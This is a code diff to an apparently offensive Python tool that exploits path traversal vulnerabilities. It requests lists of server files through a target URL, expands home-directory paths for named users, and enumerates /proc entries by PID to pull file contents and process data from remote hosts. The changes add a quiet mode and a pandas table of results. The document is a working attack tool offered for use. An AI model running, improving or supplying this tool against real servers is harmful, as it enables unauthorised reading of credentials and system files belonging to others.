@@ -6,6 +6,9 @@ import sys
 import re
 from bs4 import BeautifulSoup
 from os import system,name,path
+import pandas as pd
+
+args = None
 
 if name == "nt":
 	system('color')
@@ -16,7 +19,8 @@ BOLD = '\033[1m'
 def get_request(item, host):
 	url=host+item
 	try:
-		print("[*] Trying",url)
+		if args.quiet is False:
+			print("[*] Trying",url)
 		r = requests.get(url=url)
 		if r.status_code == 200 and r.text != "":
 			return r.text
@@ -24,8 +28,9 @@ def get_request(item, host):
 			pass
 			#print(r)
 	except Exception as e:
-		print("[-] Oops, Unable to Process the Get Request")
-		print(e)
+		if args.quiet is False:
+			print("[-] Oops, Unable to Process the Get Request")
+			print(e)
 
 def parse(container, html):
 	if container is not None:
@@ -47,6 +52,7 @@ def parse(container, html):
 			print(soup.get_text(separator="\n"))
 
 def main():
+	global args
 	pt_list = []
 	parser = argparse.ArgumentParser(description="Get juicy info through path traversal vulnerabilities")
 	group1 = parser.add_mutually_exclusive_group(required=True)
@@ -58,10 +64,13 @@ def main():
 	group1.add_argument('--file',action='store', dest='file',type=str,help='Single server file to try to access',default=None)
 	group1.add_argument('--enum-proc',action='store', dest='procs',type=str,help='<start proc#>,<end proc#> : 1,9000',required=False,default=None)
 	parser.add_argument('--users',action='store', dest='users',nargs="+",help='root user1 user2',default='root')
+	parser.add_argument('-q','--quiet',action='store_true', dest='quiet',help='supress messages',default=False)
 
 	args = parser.parse_args()
-
-	users_list = args.users
+	if args.users == "root":
+		users_list = ["root"]
+	else:
+		users_list = args.users
 
 	if args.container is not None:
 		container = args.container.split(",")
@@ -72,7 +81,7 @@ def main():
 			with open(filename,'r') as file_obj:
 				for line in file_obj:		#loads lines into a list
 					if "~/" in line:
-						for user in args.users:
+						for user in users_list:
 							temp_line = line
 							if user != "root":
 								pt_list.append(temp_line.replace("~/","/home/"+user+"/"))
@@ -87,10 +96,12 @@ def main():
 							url = args.host+args.path+line.rstrip()
 							if args.not_found is not None:
 								if args.not_found not in html:
-									print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+									if args.quiet is False:
+										print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
 									parse(args.container,html)
 							else:
-								print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+								if args.quiet is False:
+									print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
 								if args.container is not None:
 									parse(args.container,html)
 
@@ -99,7 +110,8 @@ def main():
 					except:
 						break
 		else:
-			print("[-] Unable to find file -->",filename)
+			if args.quiet is False:
+				print("[-] Unable to find file -->",filename)
 			sys.exit()
 
 	elif args.file is not None:
@@ -111,7 +123,8 @@ def main():
 					print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
 					parse(args.container,html)
 			else:
-				print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+				if args.quiet is False:
+					print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
 				if args.container is not None:
 					parse(args.container,html)
 
@@ -120,6 +133,7 @@ def main():
 
 
 	elif args.procs is not None:
+		results = []
 		start = int(args.procs.split(',')[0])
 		end = int(args.procs.split(',')[1])
 		for i in range(start,end+1):
@@ -133,10 +147,15 @@ def main():
 					text = get_request(uri,args.host)
 					if text:	
 						url = args.host + uri
-						print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
-						print(text.rstrip())
-				print()
+						if args.quiet is False:
+							print("{}[+]: {} {}".format(BOLD,url,RSTCOLORS))
+						#print(text.rstrip())
 				
-
+						results.append([text.rstrip(),i])
+				#print()
+				
+		proc_df = pd.DataFrame(results,columns=['PROC_NAME','PID'])
+		proc_df.style.hide_index()
+		print(proc_df.to_string(index = False))
 
 main()
